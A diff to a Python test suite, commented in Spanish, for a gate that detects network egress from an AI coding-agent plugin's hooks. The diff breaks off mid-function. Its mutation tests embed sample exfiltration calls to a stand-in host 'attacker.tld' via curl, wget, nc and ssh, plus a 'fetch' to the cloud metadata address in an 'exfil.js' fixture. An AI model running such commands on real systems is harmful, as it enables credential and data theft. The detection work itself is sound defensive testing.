@@ -99,17 +99,68 @@ _MODULOS_RED = {"urllib", "urllib.request", "urllib.parse", "http.client", "http
 # prohibidos: la prohibicion es para quien los LLAMA, no para la herramienta que los declara.
 _HERRAMIENTAS = {"knowledge-find.py", "capabilities.py"}
 _MAX_SALTOS = 5
+# Gap #177 (Minor, fix2 Fase 4): la puerta solo sabe ESCANEAR `.py` y `.sh`; una cita a otro
+# ejecutable (`node "…/hooks/exfil.js"`, un `.ps1`, un `.cmd`) no se recorria NI contaba como cita
+# sin resolver, asi que la lista blanca vacia no estaba impuesta. Ahora esas citas se reconocen y
+# son FALLO salvo que esten en `_EJECUTABLES_NO_ESCANEABLES_PERMITIDOS` (vacia a proposito).
+_EXT_ESCANEABLES = ("py", "sh")
+_EXT_NO_ESCANEABLES = ("js", "mjs", "ps1", "cmd")
+_EJECUTABLES_NO_ESCANEABLES_PERMITIDOS = ()
+_EXT_RE = "|".join(_EXT_ESCANEABLES + _EXT_NO_ESCANEABLES)
 # Gap #155 (Important, fix1 Fase 4): el lookahead final quita los falsos positivos del escaneo de
 # CODIGO (`hashlib.sha256` casaba como `hashlib.sh`). Hace falta porque a partir de este fix una
-# cita que no resuelve YA NO se descarta en silencio: es un fallo.
-_RUTA_RE = re.compile(r"[\w./\\-]+\.(?:py|sh)(?![\w])")
+# cita que no resuelve YA NO se descarta en silencio: es un fallo. Gap #182 (fix2): el prefijo
+# opcional `$VAR/` o `${VAR:-…}/` se captura aparte (`var`), porque sin fallback por basename una
+# cita `"$SHARED/journal.py"` solo se puede resolver sabiendo a que apunta `SHARED`.
+_RUTA_RE = re.compile(r"""(?:\$\{?(?P<var>\w+)[^}\s"'/]*\}?)?(?P<ruta>[\w./\\-]+\.(?:%s))(?![\w])"""
+                      % _EXT_RE)
 # Token de una cita dentro de una cadena de shell (`bash "${X}/hooks/a.sh"`, `python3 "$S/b.py"`).
-_TOKEN_SCRIPT_RE = re.compile(r"""[^\s"'`;|&()]*\.(?:py|sh)(?![\w])""")
+_TOKEN_SCRIPT_RE = re.compile(r"""[^\s"'`;|&()]*\.(?:%s)(?![\w])""" % _EXT_RE)
 _EXPANSION_SHELL_RE = re.compile(r"\$\{[^}]*\}|\$\w+")
 # Lista blanca EXPLICITA de citas que no corresponden a un fichero del repo. Vacia a proposito:
 # todo hook del plugin invoca scripts del plugin. Añadir una entrada aqui es una decision
 # consciente y revisable, no el descarte silencioso que encontro el gap #155.
 _CITAS_SIN_FICHERO_PERMITIDAS = ()
+# Gap #182 (Minor, fix2 Fase 4): `_resolver` ya NO busca por basename en carpetas «probables» (una
+# cita a `agent-kits/implementer/tools/journal.py`, que no existe, acababa leyendo el `journal.py`
+# de `shared/`). Una cita se resuelve SOLO por su ruta literal: relativa a la raiz del repo (o a
+# `${CLAUDE_PLUGIN_ROOT}`), relativa al directorio del fichero que la cita, o tras expandir una
+# variable asignada en el propio `.sh`. Las citas del repo que nombran un script SIN ruta -porque
+# el directorio va en una variable de Python (`os.path.join(shared, "knowledge-find.py")`)- se
+# declaran aqui UNA A UNA: `(fichero que cita, nombre citado) -> destino`.
+_CITAS_POR_NOMBRE = {
+    ("hooks/session-context.sh", "knowledge-find.py"): "agent-kits/shared/knowledge-find.py",
+    ("hooks/session-context.sh", "progress-report.py"): "agent-kits/shared/progress-report.py",
+    ("agent-kits/shared/knowledge-find.py", "__init__.py"):
+        "skills/knowledge-services/backends/__init__.py",
+    ("agent-kits/shared/knowledge-find.py", "session-context.sh"): "hooks/session-context.sh",
+}
+_VARIABLES_DE_RAIZ = ("CLAUDE_PLUGIN_ROOT", "CLAUDE_PROJECT_DIR")
+# Gap #173 (Important, fix2 Fase 4): los binarios de red se buscaban como TOKEN solo en las cadenas
+# inline; en el codigo de un script alcanzable, `subprocess.run(["curl", "-s", URL])` (lista: sin la
+# subcadena `"curl "` tras `ast.unparse`) pasaba. Ahora el AST de cada `.py` alcanzable mira los
+# argv literales (lista/tupla cuyo primer elemento es un binario), las cadenas de shell que se
+# pasan a `subprocess.*`/`os.system`/`os.popen`/`os.exec*`/`os.spawn*`/`Popen` y el CLI `claude`
+# (`which("claude")`, `[exe, "-p", ...]`): lanzar `claude -p` es egress hacia la API.
+_BINARIOS_DE_EGRESS = _BINARIOS_DE_RED | {"claude"}
+_SHELLS = {"sh", "bash", "zsh", "dash", "cmd", "powershell", "pwsh"}
+_FUNCIONES_QUE_EJECUTAN = {"system", "popen", "run", "call", "check_call", "check_output",
+                           "Popen", "getoutput", "getstatusoutput", "create_subprocess_exec",
+                           "create_subprocess_shell"}
+_PREFIJOS_QUE_EJECUTAN = ("exec", "spawn")
+# Excepcion NOMINAL al invariante «ninguna llamada de red desde hooks» (gap #173, conciliada en
+# `design.md`): el resumen IA del journal de sesion lanza `claude -p --bare` SOLO con `dev.json`
+# `sesion.resumen: true` (ADR-010 revisado, ADR-013). Vale para ESTE fichero y ESTOS motivos, y
+# solo mientras `_egress_del_journal_sin_condicion` no encuentre nada: si la guardia desaparece, la
+# excepcion deja de aplicarse y la puerta se pone roja.
+_EGRESS_OPT_IN_DECLARADO = {
+    "agent-kits/shared/journal.py": {
+        "motivos": ("ejecutable claude", "argv <variable> -p"),
+        "condicion": "`dev.json` sesion.resumen: true (`ia_activa`) o `--ia on` explicito, que "
+                     "ningun hook pasa",
+        "decision": "ADR-010 revisado / ADR-013; design.md, enmienda fix2 Fase 4",
+    },
+}
 _FLAGS_QUE_CARGAN_ADAPTADOR = ("--intent", "--backends-dir")
 _SCRIPTS_CON_RED = ("knowledge-sync.py", "capabilities.py")
 
@@ -145,10 +196,35 @@ def _codigo(ruta):
             return ast.unparse(_sin_docstrings(ast.parse(texto)))
         except SyntaxError as e:
             raise AssertionError("`%s` no parsea: %s" % (ruta, e)) from e
-    return "\n".join(l for l in texto.splitlines() if not l.lstrip().startswith("#"))
+    return "\n".join(_sin_comentario_shell(l) for l in texto.splitlines())
+
+
+def _sin_comentario_shell(linea):
+    """Gap #183 (Minor, fix2 Fase 4): quita el comentario FINAL de una linea de shell (`… # nota:
+    no usamos ssh` daba `ssh` como binario de red). Un `#` solo abre comentario fuera de comillas
+    y al principio de palabra (tras blanco, `;`, `|`, `&` o `(`): `${#ARR[@]}`, `$#`, `a#b` y
+    `"… # …"` no son comentarios. Ante comillas desparejadas no corta (conservador: mas texto que
+    escanear, nunca menos)."""
+    comilla = None
+    for i, c in enumerate(linea):
+        if comilla:
+            if c == comilla and (comilla == "'" or i == 0 or linea[i - 1] != chr(92)):
+                comilla = None
+        elif c in "'\"":
+            comilla = c
+        elif c == "#" and (i == 0 or linea[i - 1] in " \t;|&("):
+            return linea[:i].rstrip()
+    return linea
+
+
+_IMPORT_NO_LITERAL = "<import dinamico no literal>"
 
 
 def _modulos_importados(ruta):
+    """Modulos que importa un `.py`. Gap #176 (Minor, fix2 Fase 4): `__import__("socket")` e
+    `importlib.import_module("socket")` con nombre LITERAL cuentan como import; con un nombre que
+    no es literal (`"sock" + "et"`, una variable) no se puede verificar y se marca
+    `_IMPORT_NO_LITERAL`, que la puerta trata como FALLO."""
     if not ruta.endswith(".py"):
         return set()
     modulos = set()
@@ -157,26 +233,157 @@ def _modulos_importados(ruta):
             modulos |= {a.name for a in nodo.names}
         elif isinstance(nodo, ast.ImportFrom) and nodo.module:
             modulos.add(nodo.module)
+        elif isinstance(nodo, ast.Call) and _nombre_llamada(nodo) in ("__import__", "import_module"):
+            primero = nodo.args[0] if nodo.args else None
+            if isinstance(primero, ast.Constant) and isinstance(primero.value, str):
+                modulos.add(primero.value)
+            else:
+                modulos.add(_IMPORT_NO_LITERAL)
     return modulos
 
 
-def _resolver(ruta_rel, root=ROOT):
-    """Ruta real de un script citado: relativa al repo, o por NOMBRE bajo `agent-kits/shared/`,
-    `hooks/` y `skills/knowledge-services/backends/` (las carpetas de donde salen los scripts que
-    los hooks invocan y el contrato de adaptadores que `knowledge-find.py` nombra)."""
-    ruta_rel = ruta_rel.replace("\\", "/").lstrip("$/")
-    if not ruta_rel or ruta_rel in (".py", ".sh"):
+def _nombre_llamada(nodo):
+    """Ultimo componente del nombre de la funcion llamada (`subprocess.run` -> `run`)."""
+    funcion = nodo.func
+    if isinstance(funcion, ast.Attribute):
+        return funcion.attr
+    if isinstance(funcion, ast.Name):
+        return funcion.id
+    return ""
+
+
+def _binario(valor):
+    base = os.path.basename(valor.replace(chr(92), "/")).lower()
+    return base[:-4] if base.endswith(".exe") else base
+
+
+def _tokens_de_shell(cadena):
+    return [t.strip("/" + chr(92)) for t in re.split(r"""[\s;|&()"'`]+""",
+                                                    _sin_comentario_shell(cadena).lower()) if t]
+
+
+def _literal(nodo):
+    return nodo.value if isinstance(nodo, ast.Constant) and isinstance(nodo.value, str) else None
+
+
+def _egress_por_ast(ruta):
+    """Gap #173: motivos de egress en el CODIGO de un `.py` (no en sus comentarios/docstrings):
+    `argv <binario>` (lista/tupla literal que arranca por un binario de red o por `claude`),
+    `shell <binario>` (cadena de shell pasada a una funcion que ejecuta, o tras `sh -c`),
+    `exec <binario>` (`os.exec*`/`os.spawn*` con la ruta literal), `ejecutable claude` (el literal
+    `"claude"` como argumento, p. ej. `shutil.which("claude")`) y `argv <variable> -p` (argv cuyo
+    ejecutable es una variable con el `-p` del CLI headless)."""
+    if not ruta.endswith(".py"):
+        return []
+    motivos = []
+    for nodo in ast.walk(_sin_docstrings(ast.parse(_texto(ruta)))):
+        if isinstance(nodo, (ast.List, ast.Tuple)) and nodo.elts:
+            elementos = [_literal(e) for e in nodo.elts]
+            if elementos[0] is not None:
+                binario = _binario(elementos[0])
+                if binario in _BINARIOS_DE_EGRESS:
+                    motivos.append("argv " + binario)
+                elif binario in _SHELLS:
+                    for cadena in elementos[1:]:
+                        if cadena and cadena.lower() not in ("-c", "/c", "-command"):
+                            motivos += ["shell " + t for t in _tokens_de_shell(cadena)
+                                        if t in _BINARIOS_DE_EGRESS]
+            elif "-p" in elementos:
+                motivos.append("argv <variable> -p")
+        elif isinstance(nodo, ast.Call):
+            nombre = _nombre_llamada(nodo)
+            literales = [_literal(a) for a in nodo.args]
+            if "claude" in [(_binario(l) if l else None) for l in literales]:
+                motivos.append("ejecutable claude")
+            ejecuta = (nombre in _FUNCIONES_QUE_EJECUTAN
+                       or nombre.startswith(_PREFIJOS_QUE_EJECUTAN))
+            if ejecuta and literales and literales[0] is not None:
+                if nombre.startswith(_PREFIJOS_QUE_EJECUTAN):
+                    if _binario(literales[0]) in _BINARIOS_DE_EGRESS:
+                        motivos.append("exec " + _binario(literales[0]))
+                else:
+                    motivos += ["shell " + t for t in _tokens_de_shell(literales[0])
+                                if t in _BINARIOS_DE_EGRESS]
+    return motivos
+
+
+def _egress_del_journal_sin_condicion(texto):
+    """Condicion de la excepcion nominal del journal (gap #173). Devuelve lo que la ROMPE (vacio =
+    la excepcion se sostiene): `ia_activa` debe exigir `sesion.resumen` `is True`, y TODA llamada a
+    `resumen_ia` debe ir dentro de un `if` que dependa de `ia_activa(root)`."""
+    arbol = ast.parse(texto)
+    problemas = []
+    activa = [n for n in ast.walk(arbol) if isinstance(n, ast.FunctionDef) and n.name == "ia_activa"]
+    if not activa or ".get('resumen') is True" not in ast.unparse(activa[0]):
+        problemas.append("`ia_activa` ya no exige `sesion.resumen` `is True`")
+    padres = {}
+    for padre in ast.walk(arbol):
+        for hijo in ast.iter_child_nodes(padre):
+            padres[hijo] = padre
+    for nodo in ast.walk(arbol):
+        if isinstance(nodo, ast.Call) and _nombre_llamada(nodo) == "resumen_ia":
+            actual, guardado = nodo, False
+            while actual in padres:
+                actual = padres[actual]
+                if isinstance(actual, ast.If) and "ia_activa(root)" in ast.unparse(actual.test):
+                    guardado = True
+                    break
+            if not guardado:
+                problemas.append("`resumen_ia` en la linea %d no depende de `ia_activa(root)`"
+                                 % nodo.lineno)
+    return problemas
+
+
+def _resolver(ruta_rel, root=ROOT, citante=None):
+    """Ruta real de un script citado, SOLO por su ruta literal (gap #182: sin fallback por
+    basename): relativa a la raiz del repo (lo que queda de `${CLAUDE_PLUGIN_ROOT}/…`), relativa al
+    directorio del fichero que la cita (`$(dirname "$0")/x.sh`, `os.path.join(aqui, "x.py")`) o,
+    para un nombre sin ruta, por la tabla nominal `_CITAS_POR_NOMBRE`. Nunca fuera de la raiz."""
+    ruta_rel = ruta_rel.replace("\\", "/").lstrip("$")
+    # patron de `find -path "*hooks/x.sh"` (el fallback de la regla 5): la parte tras el ultimo
+    # comodin ES la ruta literal relativa a la raiz del plugin
+    relativa = ruta_rel.rsplit("*", 1)[-1].lstrip("/")
+    if not relativa or relativa.lower() in tuple("." + e for e in _EXT_ESCANEABLES + _EXT_NO_ESCANEABLES):
         return None                       # cita vacia: lo que queda de `${BASE}.py` (gap #155)
-    candidato = os.path.normpath(os.path.join(root, ruta_rel))
     raiz = os.path.normpath(root)
-    if candidato.startswith(raiz + os.sep) and os.path.isfile(candidato):
-        return candidato
-    for carpeta in (os.path.join(root, "agent-kits", "shared"), os.path.join(root, "hooks"),
-                    os.path.join(root, "skills", "knowledge-services", "backends")):
-        posible = os.path.join(carpeta, os.path.basename(ruta_rel))
-        if os.path.isfile(posible):
-            return posible
+    bases = [root] + ([os.path.dirname(citante)] if citante else [])
+    for base in bases:
+        candidato = os.path.normpath(os.path.join(base, relativa))
+        if candidato.startswith(raiz + os.sep) and os.path.isfile(candidato):
+            return candidato
+    if citante and "/" not in relativa:
+        clave = (os.path.relpath(citante, root).replace(os.sep, "/"), relativa)
+        destino = _CITAS_POR_NOMBRE.get(clave)
+        if destino and os.path.isfile(os.path.join(root, destino)):
+            return os.path.normpath(os.path.join(root, destino))
     return None
+
+
+def _valor_de_variable_shell(texto, variable):
+    """Parte literal (tras la ultima expansion) de la PRIMERA asignacion `VAR=…` de un `.sh`:
+    `SHARED="${CLAUDE_PLUGIN_ROOT:-}/agent-kits/shared"` -> `/agent-kits/shared`. `None` si la
+    variable no se asigna en el fichero."""
+    m = re.search(r"^[ \t]*(?:export[ \t]+)?%s=(?P<valor>.*)$" % re.escape(variable), texto, re.M)
+    if not m:
+        return None
+    valor = _sin_comentario_shell(m.group("valor")).strip().strip("\"'")
+    return _parte_literal(valor)
+
+
+def _resolver_cita_de_codigo(m, ruta_citante, texto_citante, root):
+    """Resuelve una cita encontrada por `_RUTA_RE` en el codigo de `ruta_citante`."""
+    variable, ruta = m.group("var"), m.group("ruta")
+    if variable in _VARIABLES_DE_RAIZ:
+        return _resolver(ruta, root)
+    if variable:
+        prefijo = (_valor_de_variable_shell(texto_citante, variable)
+                   if ruta_citante.endswith(".sh") else None)
+        return _resolver(prefijo.rstrip("/") + "/" + ruta.lstrip("/"), root) if prefijo else None
+    return _resolver(ruta, root, citante=ruta_citante)
+
+
+def _es_no_escaneable(cita):
+    return cita.rsplit(".", 1)[-1].lower() in _EXT_NO_ESCANEABLES
 
 
 def _parte_literal(token):
@@ -216,10 +423,12 @@ def _cadenas_inline(root=ROOT):
         for evento, eventos in sorted((config.get("hooks") or {}).items()):
             for bloque in eventos:
                 for hook in bloque.get("hooks") or []:
+                    # gap #183: el comentario final no es parte de lo que se ejecuta
                     cadenas.append(("hooks/hooks.json %s command" % evento,
-                                    str(hook.get("command", ""))))
+                                    _sin_comentario_shell(str(hook.get("command", "")))))
                     for indice, arg in enumerate(hook.get("args") or []):
-                        cadenas.append(("hooks/hooks.json %s args[%d]" % (evento, indice), str(arg)))
+                        cadenas.append(("hooks/hooks.json %s args[%d]" % (evento, indice),
+                                        _sin_comentario_shell(str(arg))))
     base_agentes = os.path.join(root, "agents")
     if os.path.isdir(base_agentes):
         for nombre in sorted(os.listdir(base_agentes)):
@@ -229,7 +438,8 @@ def _cadenas_inline(root=ROOT):
             if not bloque:
                 continue
             for numero, linea in enumerate(bloque.splitlines(), 1):
-                if linea.strip() and not linea.lstrip().startswith("#"):
+                linea = _sin_comentario_shell(linea)
+                if linea.strip():
                     cadenas.append(("agents/%s hooks: L%d" % (nombre, numero), linea))
     return cadenas
 
@@ -240,26 +450,34 @@ def _recorrido_hooks(root=ROOT):
     `({etiqueta relativa: ruta absoluta}, [(origen, cita) de las citas que NO resuelven])`."""
     pendientes, sin_resolver = set(), []
     for origen, cadena in _cadenas_inline(root):
-        for cita in _citas_de_cadena(cadena):
-            literal = _parte_literal(cita)
-            if _resolver(literal, root):
-                pendientes.add(literal)
+        for cita in sorted(_citas_de_cadena(cadena)):
+            if _es_no_escaneable(cita):   # gap #177: nada que la puerta sepa escanear
+                if cita not in _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS:
+                    sin_resolver.append((origen, cita))
+                continue
+            resuelta = _resolver(_parte_literal(cita), root)
+            if resuelta:
+                pendientes.add(resuelta)
             elif cita not in _CITAS_SIN_FICHERO_PERMITIDAS:
                 sin_resolver.append((origen, cita))
     vistos = {}
     for _salto in range(_MAX_SALTOS):
         siguientes = set()
-        for rel in sorted(pendientes):
-            resuelta = _resolver(rel, root)
-            if not resuelta:
-                continue
+        for resuelta in sorted(pendientes):
             etiqueta = os.path.relpath(resuelta, root).replace(os.sep, "/")
             if etiqueta in vistos:
                 continue
             vistos[etiqueta] = resuelta
-            for cita in sorted({m.group(0) for m in _RUTA_RE.finditer(_codigo(resuelta))}):
-                if _resolver(cita, root):
-                    siguientes.add(cita)
+            codigo = _codigo(resuelta)
+            for m in sorted(_RUTA_RE.finditer(codigo), key=lambda x: x.group(0)):
+                cita = m.group(0)
+                if _es_no_escaneable(cita):
+                    if cita not in _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS:
+                        sin_resolver.append((etiqueta, cita))
+                    continue
+                destino = _resolver_cita_de_codigo(m, resuelta, codigo, root)
+                if destino:
+                    siguientes.add(destino)
                 elif cita not in _CITAS_SIN_FICHERO_PERMITIDAS:
                     sin_resolver.append((etiqueta, cita))
         pendientes = siguientes
@@ -277,19 +495,30 @@ def _fuentes_ejecutables(root=ROOT):
     return fuentes
 
 
-def _ofensores_de_red(root=ROOT):
+def _ofensores_de_red(root=ROOT, excepciones=None):
+    """`[(etiqueta, motivo)]` de todo lo que un hook alcanza y toca la red. `excepciones` (por
+    defecto `_EGRESS_OPT_IN_DECLARADO`) retira SOLO los motivos declarados del fichero declarado, y
+    solo si su condicion se sostiene (`excepciones={}` devuelve el crudo del detector)."""
+    excepciones = _EGRESS_OPT_IN_DECLARADO if excepciones is None else excepciones
     ofensores = []
     for etiqueta, texto, ruta in _fuentes_ejecutables(root):
         bajo = texto.lower()
+        propios = []
         for termino in _TERMINOS_RED:
             if termino in bajo:
-                ofensores.append((etiqueta, termino))
-        for modulo in (sorted(_modulos_importados(ruta) & _MODULOS_RED) if ruta else []):
-            ofensores.append((etiqueta, "import " + modulo))
+                propios.append(termino)
+        modulos = _modulos_importados(ruta) if ruta else set()
+        propios += ["import " + modulo for modulo in sorted(modulos & _MODULOS_RED)]
+        if _IMPORT_NO_LITERAL in modulos:
+            propios.append("import dinamico no literal")
         if ruta is None:                  # cadena inline: ademas, binarios de red como TOKEN
-            for token in re.split(r"""[\s;|&()"'`]+""", bajo):
-                if token.strip("/" + chr(92)) in _BINARIOS_DE_RED:
-                    ofensores.append((etiqueta, token))
+            propios += [t for t in _tokens_de_shell(bajo) if t in _BINARIOS_DE_RED]
+        else:                             # gap #173: argv/shell/exec/claude en el AST del codigo
+            propios += sorted(set(_egress_por_ast(ruta)))
+        declarada = excepciones.get(etiqueta)
+        if declarada and ruta and not _egress_del_journal_sin_condicion(_texto(ruta)):
+            propios = [m for m in propios if m not in declarada["motivos"]]
+        ofensores += [(etiqueta, m) for m in propios]
     return ofensores
 
 
@@ -431,6 +660,219 @@ def test_mutante_urllib_en_un_hook_del_frontmatter_no_pasa_la_puerta(tmp_path):
     assert "agent-kits/shared/guardrail-check.py" in alcanzables, sorted(alcanzables)
     assert any("guardrail-check.py" in etiqueta for etiqueta, _t in _ofensores_de_red(root)), \
         "el mutante `urllib` en un hook del frontmatter sobrevive"
+
+
+# ------------------------------------------------------- mutantes de la puerta (fix2 Fase 4)
+# Gaps #173, #176, #177, #182 y #183: cada test reproduce la evasion (o el falso positivo) que
+# encontro la revision intento 2, sobre un repo MINIMO en `tmp_path` (jamas sobre el arbol real).
+
+def _hook_que_lanza(ruta_script):
+    return _hooks_json_con('python3 "${CLAUDE_PLUGIN_ROOT}/%s"' % ruta_script)
+
+
+def test_f4fix2_mutante_e4a_subprocess_run_con_curl_en_lista_no_pasa_la_puerta(tmp_path):
+    """Gap #173, mutante E4a: un script alcanzable hace `subprocess.run(["curl", "-s", URL])`.
+    En forma de LISTA no queda la subcadena `"curl "` tras `ast.unparse`, asi que el escaneo por
+    subcadena lo dejaba pasar (fix1: 35 passed)."""
+    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
+                        ficheros={"agent-kits/shared/net-probe.py":
+                                  'import subprocess\n'
+                                  'subprocess.run(["curl", "-s", "http://attacker.tld/x"])\n'})
+    ofensores = _ofensores_de_red(root)
+    assert any(e == "agent-kits/shared/net-probe.py" and "curl" in m for e, m in ofensores), \
+        ("el mutante E4a sobrevive", ofensores)
+
+
+def test_f4fix2_mutante_e4b_popen_con_wget_en_tupla_no_pasa_la_puerta(tmp_path):
+    """Gap #173, mutante E4b: `subprocess.Popen(("wget", "-q", URL))` (tupla) y la variante
+    `os.execv("/usr/bin/nc", ...)` (el binario por RUTA absoluta)."""
+    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
+                        ficheros={"agent-kits/shared/net-probe.py":
+                                  'import os, subprocess\n'
+                                  'subprocess.Popen(("wget", "-q", "http://attacker.tld/x"))\n'
+                                  'os.execv("/usr/bin/nc", ["nc", "attacker.tld", "80"])\n'})
+    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
+    assert any("wget" in m for m in motivos), ("el mutante E4b sobrevive", motivos)
+    assert any(m.endswith(" nc") for m in motivos), ("`os.execv` con `nc` sobrevive", motivos)
+
+
+def test_f4fix2_una_cadena_de_shell_pasada_a_subprocess_se_tokeniza(tmp_path):
+    """Gap #173: `subprocess.run("echo x | ssh host", shell=True)` -el binario de red en mitad de
+    una tuberia- no deja ninguna subcadena de `_TERMINOS_RED` (`ssh ` no esta en esa lista: daria
+    falsos positivos en prosa)."""
+    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
+                        ficheros={"agent-kits/shared/net-probe.py":
+                                  'import subprocess\n'
+                                  'subprocess.run("echo x | ssh attacker.tld", shell=True)\n'})
+    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
+    assert any(m.endswith(" ssh") for m in motivos), motivos
+
+
+def test_f4fix2_el_cli_claude_p_desde_un_script_alcanzable_no_pasa_la_puerta(tmp_path):
+    """Gap #173: `[exe, "-p", ...]` con `exe = shutil.which("claude")` es EGRESS (la sesion hija
+    habla con la API). Fuera de la excepcion nominal del journal (test siguiente), cualquier script
+    alcanzable que lo haga es un fallo: aqui, el MISMO codigo que `journal.py` en otro fichero."""
+    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/outbox.py"),
+                        ficheros={"agent-kits/shared/outbox.py":
+                                  'import shutil, subprocess\n'
+                                  'exe = shutil.which("claude")\n'
+                                  'cmd = [exe, "-p", "resume", "--bare"]\n'
+                                  'subprocess.run(cmd)\n'})
+    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/outbox.py"]
+    assert "ejecutable claude" in motivos, motivos
+    assert "argv <variable> -p" in motivos, motivos
+
+
+def test_f4fix2_el_egress_del_journal_es_una_excepcion_nominal_y_condicionada():
+    """Gap #173: `journal.py` (alcanzable desde `hooks/session-journal.sh`) lanza `claude -p
+    --bare` para el resumen IA -egress OPT-IN real (ADR-010 revisado, ADR-013)-. No se esconde: el
+    detector LO VE (sin excepciones sale), la excepcion es NOMINAL (este fichero y estos motivos,
+    ninguno mas) y solo vale mientras el camino siga condicionado a `dev.json` `sesion.resumen:
+    true` (`ia_activa`): es la conciliacion con «ninguna llamada de red desde hooks» que declara
+    `design.md`."""
+    crudos = _ofensores_de_red(ROOT, excepciones={})
+    del_journal = sorted({m for e, m in crudos if e == "agent-kits/shared/journal.py"})
+    assert del_journal, "el detector ya no ve el `claude -p` del journal: la excepcion esta en vacio"
+    declarada = _EGRESS_OPT_IN_DECLARADO["agent-kits/shared/journal.py"]
+    assert set(del_journal) <= set(declarada["motivos"]), del_journal
+    assert "sesion.resumen" in declarada["condicion"], declarada
+    assert sorted(_EGRESS_OPT_IN_DECLARADO) == ["agent-kits/shared/journal.py"]
+    assert [o for o in crudos if o[0] != "agent-kits/shared/journal.py"] == [], crudos
+    real = _texto(os.path.join(SHARED, "journal.py"))
+    assert _egress_del_journal_sin_condicion(real) == [], _egress_del_journal_sin_condicion(real)
+
+
+def test_f4fix2_mutante_journal_sin_la_condicion_sesion_resumen_rompe_la_excepcion():
+    """Mutante del gap #173: la llamada a `resumen_ia` deja de depender de `ia_activa(root)`, o
+    `ia_activa` deja de exigir `is True`. La excepcion nominal ya no se sostiene y la puerta lo
+    dice (sobre el TEXTO mutado; el arbol real no se toca)."""
+    real = _texto(os.path.join(SHARED, "journal.py"))
+    sin_guardia = real.replace('ia == "auto" and ia_activa(root)', 'ia == "auto"')
+    assert sin_guardia != real, "cambio la guardia de `escribir_sesion`: el mutante ya no aplica"
+    assert _egress_del_journal_sin_condicion(sin_guardia), "el mutante sin guardia sobrevive"
+    laxa = real.replace('get("resumen") is True', 'get("resumen")')
+    assert laxa != real, "cambio `ia_activa`: el mutante ya no aplica"
+    assert _egress_del_journal_sin_condicion(laxa), "el mutante `ia_activa` laxa sobrevive"
+
+
+def test_f4fix2_una_copia_del_journal_sin_guardia_pierde_la_excepcion(tmp_path):
+    """Gap #173, sobre una COPIA del repo: el `journal.py` REAL, alcanzable desde un hook, pasa la
+    puerta; el mismo fichero con la llamada a `resumen_ia` sin la guardia `ia_activa(root)` ya no
+    (la excepcion nominal exige su condicion, no solo el nombre del fichero). Ademas, ningun hook
+    fuerza el camino con `--ia on`."""
+    real = _texto(os.path.join(SHARED, "journal.py"))
+    hook = _hook_que_lanza("agent-kits/shared/journal.py")
+    for clave, texto, esperado in (
+            ("real", real, False),
+            ("sin-guardia", real.replace('ia == "auto" and ia_activa(root)', 'ia == "auto"'), True)):
+        root = _repo_minimo(tmp_path / clave, hooks_json=hook,
+                            ficheros={"agent-kits/shared/journal.py": texto,
+                                      "agent-kits/shared/redact.py": "import re" + chr(10)})
+        motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/journal.py"]
+        assert bool([m for m in motivos if "claude" in m or "-p" in m]) is esperado, (clave, motivos)
+    # nominal por FICHERO: el mismo codigo, guardia incluida, con otro nombre, no esta exento
+    root = _repo_minimo(tmp_path / "otro-nombre", hooks_json=_hook_que_lanza("agent-kits/shared/outbox.py"),
+                        ficheros={"agent-kits/shared/outbox.py": real,
+                                  "agent-kits/shared/redact.py": "import re" + chr(10)})
+    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/outbox.py"]
+    assert "ejecutable claude" in motivos, motivos
+    for etiqueta, texto, _ruta in _fuentes_ejecutables():
+        assert not re.search(r"journal[.]py[^" + chr(10) + r"]*--ia[ =]+on", texto), etiqueta
+
+
+def test_f4fix2_mutante_e7_import_dinamico_de_socket_no_pasa_la_puerta(tmp_path):
+    """Gap #176, mutantes E7a/E7b: `__import__("socket")` (literal: es un import) e
+    `importlib.import_module("sock" + "et")` (no literal: FALLO, no se puede verificar)."""
+    for clave, codigo, esperado in (
+            ("e7a", '__import__("socket").create_connection\n', "import socket"),
+            ("e7b", 'import importlib\nimportlib.import_module("sock" + "et")\n', "no literal")):
+        root = _repo_minimo(tmp_path / clave,
+                            hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
+                            ficheros={"agent-kits/shared/net-probe.py": codigo})
+        motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
+        assert any(esperado in m for m in motivos), (clave, motivos)
+
+
+def test_f4fix2_import_module_literal_de_un_modulo_inocuo_no_es_ofensor(tmp_path):
+    """Control negativo del #176: un `import_module("json")` literal es un import mas."""
+    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/ok.py"),
+                        ficheros={"agent-kits/shared/ok.py":
+                                  'import importlib\nimportlib.import_module("json")\n'})
+    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)
+
+
+def test_f4fix2_mutante_e8_un_hook_que_lanza_javascript_no_pasa_la_puerta(tmp_path):
+    """Gap #177, mutante E8: `node "…/hooks/exfil.js"` (con `fetch` al IMDS dentro) no se
+    recorria NI contaba como cita sin resolver. Toda cita a un ejecutable que la puerta no sabe
+    escanear (`.js`/`.mjs`/`.ps1`/`.cmd`) es FALLO salvo lista blanca nominal (vacia)."""
+    for script in ("hooks/exfil.js", "hooks/exfil.mjs", "hooks/exfil.ps1", "hooks/exfil.cmd"):
+        root = _repo_minimo(tmp_path / script.rsplit(".", 1)[1],
+                            hooks_json=_hooks_json_con('node "${CLAUDE_PLUGIN_ROOT}/%s"' % script),
+                            ficheros={script: "fetch('http://169.254.169.254/latest/meta-data/')\n"})
+        _alcanzables, sin_resolver = _recorrido_hooks(root)
+        assert any(script.rsplit("/", 1)[1] in c for _o, c in sin_resolver), (script, sin_resolver)
+    assert _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS == ()
+
+
+def test_f4fix2_mutante_e8_un_script_alcanzable_que_cita_javascript_no_pasa(tmp_path):
